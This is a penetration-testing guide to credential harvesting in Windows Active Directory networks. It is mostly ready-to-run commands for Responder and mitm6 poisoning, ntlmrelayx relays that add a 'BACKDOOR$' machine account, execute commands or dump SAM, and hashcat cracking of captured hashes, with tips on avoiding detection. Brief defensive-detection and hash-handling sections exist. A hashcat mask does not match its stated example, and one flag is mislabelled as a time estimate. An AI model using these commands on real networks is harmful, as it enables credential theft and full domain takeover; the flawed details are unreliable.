# Responder and mitm6 Credential Harvesting Guide

## Introduction

Credential harvesting through protocol poisoning is one of the highest-yield techniques in internal network penetration testing. Unlike brute-force attacks that generate noise and trigger account lockouts, protocol poisoning passively waits for target hosts to broadcast name resolution requests, then responds with forged answers that trick the targets into authenticating against the attacker. The result is captured NTLM hashes that can be cracked offline or relayed to other systems without sending a single authentication request.

This guide covers three primary credential harvesting methods: Responder for LLMNR/NBT-NS/mDNS poisoning on IPv4 networks, mitm6 for IPv6 SLAAC-based MITM that chains to NTLM relay, and the complete workflow from hash capture through offline cracking with hashcat. These techniques are particularly effective against Windows Active Directory environments where legacy name resolution protocols are often still enabled.

## LLMNR and NBT-NS Protocol Poisoning with Responder

### Understanding the Attack Vector

When a Windows host attempts to resolve a hostname, it follows a specific order:
1. Check the local HOSTS file
2. Query the configured DNS server
3. If DNS fails (NXDOMAIN or timeout), broadcast an LLMNR query (UDP port 5355, multicast 224.0.0.252)
4. If LLMNR fails, broadcast an NBT-NS query (UDP port 137, broadcast)

Steps 3 and 4 are the vulnerability. LLMNR and NBT-NS are unauthenticated broadcast protocols — any host on the same segment can respond. Responder listens for these broadcast queries and responds first, claiming to be the requested host. When the target receives the response, it attempts to authenticate to the "resolved" host using NTLM, sending a challenge-response hash that Responder captures.

Common triggers for LLMNR/NBT-NS queries:
- Typos in file share paths (`\\fleserver\share` instead of `\\fileserver\share`)
- Scheduled tasks referencing decommissioned servers
- Browser prefetching non-existent hostnames from web pages
- Services referencing servers by short name when DNS only resolves FQDNs
- WPAD proxy auto-discovery queries

### Responder Basic Usage

```bash
# Start Responder with all protocols enabled (default)
sudo responder -I eth0

# Enable WPAD, DHCP proxy, and force authentication
sudo responder -I eth0 -w -d -f

# Analysis mode — passive listening only, no poisoning
# Use this first to assess the environment without risk
sudo responder -I eth0 -A
```

Key flags:
- `-I eth0` — specify the interface
- `-w` — enable WPAD rogue proxy server (captures browser proxy auth)
- `-d` — enable DHCP answers (redirects DNS via DHCP)
- `-f` — force authentication (fingerprints the remote host)
- `-A` — analysis mode (listen only, no poisoning)
- `--lm` — force LM hashing downgrade (for NTLMv1 capture)

### Responder Configuration Tuning

The Responder configuration file controls which protocols are poisoned:

```bash
# Edit the configuration
nano /usr/share/responder/Responder.conf
```

Key settings to tune:

```ini
[Responder Core]
; Disable protocols you don't want to respond to
SQL = Off
FTP = Off
IMAP = Off
POP3 = Off
SMTP = Off

; Keep the high-value protocols enabled
HTTP = On
SMB = On
LDAP = On
DNS = On

[HTTP Server]
; Serve a custom challenge to capture NTLM
Challenge = 1122334455667788
```

Setting the Challenge to a known value (e.g., `1122334455667788`) makes offline cracking faster because the challenge is fixed and predictable.

### Understanding Captured Hashes

Responder stores captured hashes in `/usr/share/responder/logs/`:

```bash
# List captured hashes
ls -la /usr/share/responder/logs/

# View NTLMv2 hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

A captured NetNTLMv2 hash looks like:

```
DOMAIN\username::DOMAIN:1122334455667788:ABCDEF0123456789ABCDEF0123456789:0101000000000000...
```

Format breakdown:
- `DOMAIN\username` — the account that authenticated
- `DOMAIN` — the NetBIOS domain name
- `1122334455667788` — the server challenge (from Responder)
- `ABCDEF0123456789...` — the NTLMv2 response (contains the proof of password knowledge)
- `0101000000000000...` — the blob (client metadata and timestamp)

### Responder + ntlmrelayx Chaining

For maximum impact, chain Responder with Impacket's ntlmrelayx to relay captured authentications instead of just collecting hashes:

```bash
# Terminal 1: Start Responder with SMB and HTTP disabled
# (let ntlmrelayx handle these to avoid conflict)
# Edit Responder.conf: set SMB=Off, HTTP=Off
sudo responder -I eth0

# Terminal 2: Start ntlmrelayx targeting hosts with SMB signing disabled
ntlmrelayx.py -tf smb_targets.txt -smb2support

# Terminal 3: Alternative relay targets
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer PENTEST$ --delegate-access
```

This combination is powerful: Responder poisons the name resolution and captures the authentication, while ntlmrelayx relays it to a target host. The relay succeeds when the target does not require SMB signing.

## IPv6 MITM with mitm6

### Why IPv6 Matters for Credential Harvesting

Most internal networks are IPv4-only in practice, but Windows enables IPv6 by default and prefers it over IPv4. This creates a significant blind spot: network monitoring and security controls often focus exclusively on IPv4 traffic. mitm6 exploits this by advertising the attacker as an IPv6 router via SLAAC (Stateless Address Autoconfiguration), making the attacker the default gateway for IPv6 traffic from Windows hosts.

Once the victim configures an IPv6 address via SLAAC, it queries for DNS resolution. mitm6 responds with the attacker's address as the DNS server, effectively creating a DNS-based MITM without any ARP spoofing. The victim then sends NTLM authentication to the attacker when accessing internal resources.

### mitm6 Basic Usage

```bash
# Start mitm6 targeting a specific domain
sudo mitm6 -d domain.local -i eth0

# Target specific hosts only
sudo mitm6 -d domain.local -i eth0 --target 192.168.1.100

# Ignore domain controllers (to avoid detection)
sudo mitm6 -d domain.local -i eth0 --ignore 192.168.1.1,192.168.1.2

# Debug mode for troubleshooting
sudo mitm6 -d domain.local -i eth0 --debug
```

### mitm6 Attack Workflow

The attack unfolds in four phases:

1. **SLAAC Advertisement**: mitm6 sends Router Advertisements (RA) to the multicast address ff02::1, advertising itself as an IPv6 router. Windows hosts receive this and auto-configure an IPv6 address.

2. **DNS Takeover**: The victim configures mitm6's IPv6 address as its DNS server via DHCPv6. All DNS queries now go through the attacker.

3. **Authentication Capture**: When the victim accesses an internal resource (e.g., `\\fileserver\share`), the DNS query resolves to the attacker's address. The victim attempts NTLM authentication to connect, sending hashes to the attacker.

4. **Relay or Harvest**: The attacker either captures the hash (like Responder) or relays it to a target system via ntlmrelayx.

### mitm6 + ntlmrelayx Complete Chain

This is one of the most powerful credential harvesting techniques against Active Directory:

```bash
# Terminal 1: Start mitm6
sudo mitm6 -d domain.local -i eth0

# Terminal 2: Start ntlmrelayx with IPv6 support
# Option A: Relay to LDAP to create a computer account with delegation
ntlmrelayx.py -6 -t ldaps://dc01.domain.local --add-computer BACKDOOR$ --delegate-access

# Option B: Relay to SMB for command execution
ntlmrelayx.py -6 -t smb://192.168.1.50 -smb2support -c "whoami > C:\proof.txt"

# Option C: Relay to multiple targets from a list
ntlmrelayx.py -6 -tf targets.txt -smb2support --dump-sam
```

After the relay creates a computer account with resource-based constrained delegation, the attacker can impersonate any user (including domain admins) to any service on the relay target, achieving domain escalation without cracking a single password.

### Detecting mitm6 Attacks

From a defensive perspective, mitm6 attacks can be detected by:

- Monitoring for unexpected IPv6 Router Advertisements on networks where IPv6 is not officially used
- Windows Event ID 5007 (network profile change) when a new IPv6 gateway appears
- DHCPv6 server logs showing unauthorized DHCPv6 responses
- Network monitoring tools that track IPv6 neighbor discovery traffic

## NTLM Hash Analysis

### Distinguishing Hash Types

Understanding the hash type determines the cracking approach:

```bash
# NetNTLMv2 (most common from Responder) — hashcat mode 5600
# Format: username::domain:challenge:response:blob
# Example: admin::CORP:1122334455667788:A1B2C3D4E5F6...:01010000...

# NetNTLMv1 (older, weaker) — hashcat mode 5500
# Format: username::domain:lm_response:ntlm_response:challenge
# Easier to crack due to weaker algorithm

# NTLM (raw hash from SAM dump or secretsdump) — hashcat mode 1000
# Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Kerberoast TGS-REP — hashcat mode 13100
# Format: $krb5tgs$23$*user$DOMAIN$service*$hash...

# AS-REP Roast — hashcat mode 18200
# Format: $krb5asrep$23$user@DOMAIN:hash...
```

### Assessing Hash Strength Before Cracking

```bash
# Count hashes by type
grep -c "NTLMv2" /usr/share/responder/logs/*.txt
grep -c "NTLMv1" /usr/share/responder/logs/*.txt

# Extract unique usernames
grep "NTLMv2" /usr/share/responder/logs/*.txt | cut -d: -f1 | sort -u

# Identify high-value accounts (admin, service, backup)
grep -iE "admin|service|backup|sql|svc" /usr/share/responder/logs/*.txt
```

## Offline Cracking with hashcat

### Basic Hash Cracking

```bash
# Prepare hashes from Responder logs
# Extract NTLMv2 hashes into hashcat-compatible format
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > /tmp/ntlmv2_hashes.txt

# Crack with rockyou.txt wordlist
hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules for password variation
hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Crack NetNTLMv1 hashes
hashcat -m 5500 /tmp/ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked results
hashcat -m 5600 /tmp/ntlmv2_hashes.txt --show
```

### Advanced Cracking Techniques

```bash
# Session with restore (for long-running cracks)
hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  --session responder_crack

# Resume interrupted session
hashcat --session responder_crack --restore

# Combine wordlists with rules for maximum coverage
hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule \
  -r /usr/share/hashcat/rules/best64.rule

# Mask attack for known password patterns (e.g., CompanyName + Season + Year)
hashcat -m 5600 /tmp/ntlmv2_hashes.txt -a 3 "?u?u?u?u?l?l?l?l?d?d?d?d"
# Matches patterns like CORPsummer2025

# Hybrid attack (wordlist + mask append)
hashcat -m 5600 /tmp/ntlmv2_hashes.txt \
  /usr/share/wordlists/rockyou.txt -a 6 ?d?d?d?d
# Appends 4 digits to each word (password1234)
```

### Estimating Cracking Time

```bash
# Benchmark hashcat performance for NTLMv2
hashcat -m 5600 -b

# Show estimated time for a specific attack
hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt --keyboard-layout-mapping en.hccharmap
```

Typical cracking speeds (approximate, with modern GPU):
- NetNTLMv2 (mode 5600): ~1-5 MH/s on RTX 3080
- NetNTLMv1 (mode 5500): ~5-15 MH/s
- Raw NTLM (mode 1000): ~50-100 GH/s

## Operational Security Considerations

### Minimizing Detection During Harvesting

- Run Responder in analysis mode (`-A`) first to assess the environment before active poisoning.
- Target specific time windows (e.g., morning login hours) rather than running continuously.
- Disable Responder protocols you don't need (reduce the attack surface and log entries).
- Use mitm6 selectively — IPv6 RAs are often less monitored than ARP spoofing.
- Collect what you need and stop. Extended poisoning sessions increase detection risk.
- Coordinate with the blue team (if a purple team engagement) to validate detection coverage.

### Handling Captured Credentials

- Never store captured hashes in plaintext in reports. Use the format: "NTLMv2 hash captured for DOMAIN\username (crackable / not crackable within the engagement window)".
- Report cracked passwords through a secure channel (encrypted email, secure file share), never in the report PDF.
- Delete all captured hashes and PCAP files after the engagement unless the client explicitly requests retention.
- For domain admin hashes, treat them with the highest sensitivity — a single domain admin hash enables full domain compromise.

## References

- [Responder GitHub Repository](https://github.com/SpiderLabs/Responder) — Official Responder tool and documentation
- [mitm6 — Fox-IT Research](https://fox-it.com/blog/2018/01/11/mitm6-combining-ipv4-and-ipv6/) — Original mitm6 research and attack walkthrough
- [Impacket ntlmrelayx Documentation](https://github.com/SecureAuthCorp/impacket) — NTLM relay tool for credential forwarding
- [hashcat Hash Modes Reference](https://hashcat.net/wiki/doku.php?id=hashcat) — Complete hash type and mode reference
- [MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1557/001/) — MITRE technique for name resolution poisoning
- [MITRE ATT&CK T1557.002 — ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002/) — MITRE technique for ARP-based MITM
- [SANS — LLMNR/NBT-NS Poisoning Deep Dive](https://www.sans.org/blog/llmnr-nbt-ns-poisoning/) — SANS analysis of name resolution attack vectors
